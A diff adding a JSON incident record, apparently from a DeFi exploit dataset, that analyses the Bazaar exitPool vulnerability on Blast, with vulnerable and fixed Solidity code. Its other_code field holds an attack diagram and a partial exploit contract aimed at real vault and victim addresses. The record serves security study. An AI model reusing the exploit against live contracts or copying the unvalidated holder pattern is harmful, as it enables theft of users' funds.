@@ -1,0 +1,32 @@
+{
+ "id": "2024__2024-06-XX_Bazaar_ExitPoolArbitraryHolder",
+ "source_file": "2024/2024-06-XX_Bazaar_ExitPoolArbitraryHolder.md",
+ "title": "Bazaar — exitPool() Arbitrary Holder Address Vulnerability Analysis",
+ "date": "2024-06-01",
+ "protocol": "Bazaar",
+ "chain": "Blast",
+ "loss_raw": "~$1,400,000",
+ "loss_usd": 1400000.0,
+ "root_cause": "Calling `exitPool()` on the Balancer Vault with an arbitrary holder address and MAX_ETH_OUT (850M ether) parameter passed via `userData`, forcibly withdrawing a victim's liquidity",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no holder validation in exitPool userData\ncontract BazaarPool {\n    function exitPool(\n        bytes32 poolId,\n        address sender,\n        address payable recipient,\n        ExitPoolRequest memory request\n    ) external {\n        // Extract holder address from userData — no validation\n        (address holder, uint256 maxAmountOut) = abi.decode(\n            request.userData, (address, uint256)\n        );\n        // Does not verify that holder == msg.sender\n        // Attacker can pass an arbitrary victim address as holder\n        uint256 lpBalance = lpToken.balanceOf(holder);\n        lpToken.burnFrom(holder, lpBalance);\n        _transferTokens(recipient, maxAmountOut);\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: holder validation added\nfunction exitPool(\n    bytes32 poolId,\n    address sender,\n    address payable recipient,\n    ExitPoolRequest memory request\n) external {\n    (address holder, uint256 maxAmountOut) = abi.decode(\n        request.userData, (address, uint256)\n    );\n    // holder must be msg.sender (or an approved address)\n    require(\n        holder == msg.sender || isApprovedForAll(holder, msg.sender),\n        \"unauthorized holder\"\n    );\n    uint256 lpBalance = lpToken.balanceOf(holder);\n    lpToken.burnFrom(holder, lpBalance);\n    _transferTokens(recipient, maxAmountOut);\n}"
+ ],
+ "steps": [
+  "→ [1] Balancer Vault.exitPool(",
+  "No holder validation → entire victim LP burned",
+  "Victim's liquidity → transferred to attacker address",
+  "→ [2] ~$1.4M RYOLO/ETH stolen"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Balancer Vault.exitPool(\n  │         poolId    = RYOLO pool ID,\n  │         sender    = attacker,\n  │         recipient = attacker,\n  │         userData  = abi.encode(\n  │             holder     = 0xb66585C4E460D49154D50325CE60aDC44bc900E9,  ← victim\n  │             maxAmountOut = 850_000_000 ether  ← entire liquidity\n  │         )\n  │       )\n  │         └─ No holder validation → entire victim LP burned\n  │         └─ Victim's liquidity → transferred to attacker address\n  │\n  └─→ [2] ~$1.4M RYOLO/ETH stolen",
+  "interface IBalancerVault {\n    struct ExitPoolRequest {\n        address[] assets;\n        uint256[] minAmountsOut;\n        bytes userData;\n        bool toInternalBalance;\n    }\n\n    function exitPool(\n        bytes32 poolId,\n        address sender,\n        address payable recipient,\n        ExitPoolRequest memory request\n    ) external;\n}\n\ncontract AttackContract {\n    IBalancerVault constant vault = IBalancerVault(0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB);\n    address constant victim = 0xb66585C4E460D49154D50325CE60aDC44bc900E9;\n    IERC20 constant RYOLO = IERC20(0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb);\n\n    function testExploit() external {\n        bytes32 poolId = /* RYOLO pool ID */;\n\n        address[] memory assets = new address[](2);\n        assets[0] = address(RYOLO);\n        "
+ ]
+}
